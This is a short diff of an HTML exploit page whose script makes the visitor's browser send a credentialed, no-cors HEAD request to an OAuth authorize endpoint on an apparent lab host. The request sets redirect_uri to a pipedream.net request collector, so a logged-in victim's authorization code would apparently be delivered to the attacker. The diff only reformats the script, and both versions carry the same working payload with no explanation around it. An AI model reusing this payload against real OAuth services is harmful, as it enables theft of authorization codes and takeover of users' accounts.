@@ -1,17 +1,8 @@
 <html>
   <body>
 <script>
-  const authUrl = `http://authorization-ptl-929f8477-75deddee.libcurl.so/oauth/authorize?redirect_uri=https://ennwrzdc9sbot.x.pipedream.net&client_id=3b189b4c63ee8ac8240e73c0ab4de9c7498ac361f4a498df85b53e0a37d5bd38&scope=&response_type=code`;
-    fetch(
-      authUrl,
-      {
-        method: 'HEAD',
-        credentials: 'include',
-        mode: 'no-cors'
-      }
-    ).catch(err => {
-      throw err;
-    }).then(() => {});
+  const authUrl = 'http://authorization-ptl-929f8477-75deddee.libcurl.so/oauth/authorize?redirect_uri=https://ennwrzdc9sbot.x.pipedream.net&client_id=3b189b4c63ee8ac8240e73c0ab4de9c7498ac361f4a498df85b53e0a37d5bd38&scope=&response_type=code';
+    fetch(authUrl,{method: 'HEAD', credentials: 'include', mode: 'no-cors'}).catch(err => { throw err;}).then(() =>{});
 
 </script>
 </body>
